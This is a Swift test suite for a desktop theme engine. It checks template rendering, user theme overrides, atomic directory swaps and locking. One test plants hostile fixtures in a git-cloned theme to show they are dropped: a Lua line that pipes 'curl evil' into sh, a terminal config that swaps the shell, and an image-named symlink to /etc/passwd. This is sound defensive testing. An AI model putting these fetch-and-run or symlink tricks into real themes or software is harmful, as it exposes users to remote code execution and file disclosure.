import Foundation
import Synchronization
import Testing
@testable import FocusDockCore

/// A temp home with a small shipped theme set; removed when the value is released.
final class Sandbox {
    let root: URL
    let paths: ThemePaths

    init() throws {
        root = FileManager.default.temporaryDirectory.appending(path: "focusdock-\(UUID().uuidString)")
        paths = ThemePaths(home: root.appending(path: "home"), shippedThemes: root.appending(path: "Themes"), shippedTemplates: root.appending(path: "Templates"))
        try write("Themes/dusk/colors.toml", "accent = \"#7aa2f7\"\nbackground = \"#1a1b26\"\nforeground = \"#a9b1d6\"\n")
        try write("Themes/dusk/neovim.lua", "return { theme = 'dusk' }\n")
        try write("Themes/paper/colors.toml", "mode = \"light\"\naccent = \"#d20f39\"\nbackground = \"#eff1f5\"\nforeground = \"#4c4f69\"\n")
        try write("Templates/neovim.lua.tpl", "return { bg = '{{ background }}' }\n")
        try write("Templates/focusdock.toml.tpl", "accent = \"{{ accent }}\"\n")
        try write("Templates/claude.json.tpl", "{ \"base\": \"{{ mode }}\" }\n")
    }

    deinit { try? FileManager.default.removeItem(at: root) }

    func write(_ relative: String, _ text: String) throws {
        let url = root.appending(path: relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
    }

    func read(_ url: URL) -> String? { TextFile.read(url) }
    func exists(_ url: URL) -> Bool { FileManager.default.fileExists(atPath: url.path) }
}

/// Records what it was asked to apply, optionally after a delay.
final class RecordingTarget: ThemeTarget, @unchecked Sendable {
    let name = "recorder"
    private let lock = NSLock()
    private var log: [String] = []
    var applied: [String] { lock.withLock { log } }

    func apply(_ context: ThemeContext) async throws -> String {
        let accent = context.colors["accent"] ?? "?"
        lock.withLock { log.append(accent) }
        return "applied \(accent)"
    }

    func reset() async throws -> String {
        lock.withLock { log.append("reset") }
        return "reset"
    }
}

struct ThemeEngineTests {
    @Test func setRendersTemplatesAndSwapsIn() async throws {
        let box = try Sandbox()
        let engine = ThemeEngine(paths: box.paths, targets: [])
        let applied = try await engine.set("Dusk")
        #expect(applied.name == "dusk")
        #expect(engine.current() == "dusk")
        #expect(box.read(box.paths.currentTheme.appending(path: "focusdock.toml")) == "accent = \"#7aa2f7\"\n")
        #expect(box.read(box.paths.currentTheme.appending(path: "claude.json")) == "{ \"base\": \"dark\" }\n")
        #expect(!box.exists(box.paths.nextTheme))
        #expect(engine.isCurrent(applied.generation))
    }

    @Test func aFileTheThemeShipsWinsOverTheTemplate() async throws {
        let box = try Sandbox()
        _ = try await ThemeEngine(paths: box.paths, targets: []).set("dusk")
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { theme = 'dusk' }\n")
        _ = try await ThemeEngine(paths: box.paths, targets: []).set("paper")
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { bg = '#eff1f5' }\n")
    }

    @Test func userTemplatesOverrideShippedOnes() async throws {
        let box = try Sandbox()
        try box.write("home/.config/focusdock/themed/focusdock.toml.tpl", "mine = \"{{ accent_strip }}\"\n")
        _ = try await ThemeEngine(paths: box.paths, targets: []).set("dusk")
        #expect(box.read(box.paths.currentTheme.appending(path: "focusdock.toml")) == "mine = \"7aa2f7\"\n")
    }

    @Test func userThemesOverrideShippedThemesByName() async throws {
        let box = try Sandbox()
        try box.write("home/.config/focusdock/themes/dusk/colors.toml", "accent = \"#ff0000\"\nbackground = \"#000000\"\n")
        try box.write("home/.config/focusdock/themes/dusk/neovim.lua", "return { mine = true }\n")
        try box.write("home/.config/focusdock/themes/mine/colors.toml", "accent = \"#00ff00\"\n")
        let engine = ThemeEngine(paths: box.paths, targets: [])
        #expect(engine.list() == ["dusk", "mine", "paper"])
        _ = try await engine.set("dusk")
        #expect(box.read(box.paths.currentTheme.appending(path: "focusdock.toml")) == "accent = \"#ff0000\"\n")
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { mine = true }\n")
    }

    @Test func aThemeClonedFromGitMayNotShipCode() async throws {
        let box = try Sandbox()
        let theme = "home/.config/focusdock/themes/stranger"
        try box.write("\(theme)/.git/HEAD", "ref: refs/heads/main\n")
        try box.write("\(theme)/colors.toml", "accent = \"#123456\"\n")
        try box.write("\(theme)/neovim.lua", "os.execute('curl evil | sh')\n")
        try box.write("\(theme)/kitty.conf", "shell /bin/evil\n")
        try box.write("\(theme)/README.md", "hi\n")
        try box.write("\(theme)/btop.theme", "theme[main_bg]=\"#123456\"\n")
        try FileManager.default.createSymbolicLink(at: box.root.appending(path: "\(theme)/unlock.png"), withDestinationURL: URL(filePath: "/etc/passwd"))
        let applied = try await ThemeEngine(paths: box.paths, targets: []).set("stranger")
        #expect(applied.ignored.sorted() == ["kitty.conf", "neovim.lua", "unlock.png"])
        let staged = Set((try? FileManager.default.contentsOfDirectory(atPath: box.paths.currentTheme.path)) ?? [])
        #expect(staged.contains("btop.theme"))
        #expect(!staged.contains("kitty.conf"))
        #expect(!staged.contains("unlock.png"))
        // The dropped Lua is replaced by the template's colour-only output.
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { bg = '' }\n")
    }

    @Test func aHandWrittenUserThemeMayShipLua() async throws {
        let box = try Sandbox()
        try box.write("home/.config/focusdock/themes/own/colors.toml", "accent = \"#123456\"\n")
        try box.write("home/.config/focusdock/themes/own/neovim.lua", "return { own = true }\n")
        let applied = try await ThemeEngine(paths: box.paths, targets: []).set("own")
        #expect(applied.ignored.isEmpty)
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { own = true }\n")
    }

    @Test func rejectsUnknownAndEscapingNames() async throws {
        let box = try Sandbox()
        let engine = ThemeEngine(paths: box.paths, targets: [])
        await #expect(throws: ThemeError.notFound("nope", available: ["dusk", "paper"])) { try await engine.set("nope") }
        await #expect(throws: ThemeError.invalidName("../etc")) { try await engine.set("../etc") }
        await #expect(throws: ThemeError.invalidName(".hidden")) { try await engine.set(".hidden") }
    }

    @Test func aFailedStageLeavesTheCurrentThemeUntouched() async throws {
        let box = try Sandbox()
        let engine = ThemeEngine(paths: box.paths, targets: [])
        _ = try await engine.set("dusk")
        try box.write("Themes/broken/neovim.lua", "return {}\n")
        await #expect(throws: ThemeError.noColors("broken")) { try await engine.set("broken") }
        #expect(engine.current() == "dusk")
        #expect(box.read(box.paths.currentTheme.appending(path: "neovim.lua")) == "return { theme = 'dusk' }\n")
    }

    @Test func swapExchangesDirectoriesAtomically() throws {
        let box = try Sandbox()
        try box.write("a/staged/file", "new\n")
        try box.write("a/live/file", "old\n")
        try ThemeEngine.swap(box.root.appending(path: "a/staged"), into: box.root.appending(path: "a/live"))
        #expect(box.read(box.root.appending(path: "a/live/file")) == "new\n")
        #expect(!box.exists(box.root.appending(path: "a/staged")))
    }

    @Test func aSupersededRetintDoesNothing() async throws {
        let box = try Sandbox()
        let recorder = RecordingTarget()
        let engine = ThemeEngine(paths: box.paths, targets: [recorder])
        let older = try await engine.set("dusk")
        let newer = try await engine.set("paper")
        #expect(await engine.retint(newer).isEmpty)
        #expect(await engine.retint(older).isEmpty)
        #expect(recorder.applied == ["#d20f39"])
    }

    @Test func concurrentSwitchesEndOnTheLastOne() async throws {
        let box = try Sandbox()
        let recorder = RecordingTarget()
        let engine = ThemeEngine(paths: box.paths, targets: [recorder])
        await withTaskGroup(of: Void.self) { group in
            for name in ["dusk", "paper", "dusk", "paper"] {
                group.addTask {
                    guard let applied = try? await engine.set(name) else { return }
                    _ = await engine.retint(applied)
                }
            }
        }
        let last = try #require(recorder.applied.last)
        let current = try #require(engine.current())
        let expected = current == "dusk" ? "#7aa2f7" : "#d20f39"
        #expect(last == expected)
    }

    /// A waiter must not park a cooperative thread in flock: with more waiters than pool threads,
    /// the suspended holder could never resume (the CI hang on a 3-core runner).
    @Test func lockWaitersDoNotStarveASuspendedHolder() async throws {
        let box = try Sandbox()
        let lock = box.paths.lock
        let inside = Mutex(0)
        try await withThrowingTaskGroup(of: Int.self) { group in
            for _ in 0..<(ProcessInfo.processInfo.activeProcessorCount * 2 + 2) {
                group.addTask {
                    try await FileLock.withLock(lock) {
                        let holders = inside.withLock { $0 += 1; return $0 }
                        try await Task.sleep(for: .milliseconds(1))
                        inside.withLock { $0 -= 1 }
                        return holders
                    }
                }
            }
            for try await holders in group { #expect(holders == 1) }
        }
    }

    @Test func resetRemovesTheThemeAndCallsEveryTarget() async throws {
        let box = try Sandbox()
        let recorder = RecordingTarget()
        let engine = ThemeEngine(paths: box.paths, targets: [recorder])
        let applied = try await engine.set("dusk")
        #expect(try await engine.reset().isEmpty)
        #expect(engine.current() == nil)
        #expect(!box.exists(box.paths.currentTheme))
        #expect(recorder.applied == ["reset"])
        #expect(await engine.retint(applied).isEmpty)
        #expect(recorder.applied == ["reset"])
    }

    @Test func nextAndPreviousWrapAround() async throws {
        let box = try Sandbox()
        let engine = ThemeEngine(paths: box.paths, targets: [])
        #expect(engine.neighbour(offset: 1) == "dusk")
        _ = try await engine.set("paper")
        #expect(engine.neighbour(offset: 1) == "dusk")
        #expect(engine.neighbour(offset: -1) == "dusk")
    }

    @Test func rendersEveryShippedThemeWithTheShippedTemplates() async throws {
        let box = try Sandbox()
        let paths = ThemePaths(home: box.paths.home, shippedThemes: Repo.themes, shippedTemplates: Repo.templates)
        let engine = ThemeEngine(paths: paths, targets: [])
        for name in engine.list() {
            _ = try await engine.set(name)
            let files = Set((try? FileManager.default.contentsOfDirectory(atPath: paths.currentTheme.path)) ?? [])
            let expected: Set = ["colors.toml", "btop.theme", "claude.json", "focusdock.toml", "neovim.lua", "wezterm.lua", "zed.json"]
            #expect(expected.isSubset(of: files), "\(name): \(files)")
        }
    }
}
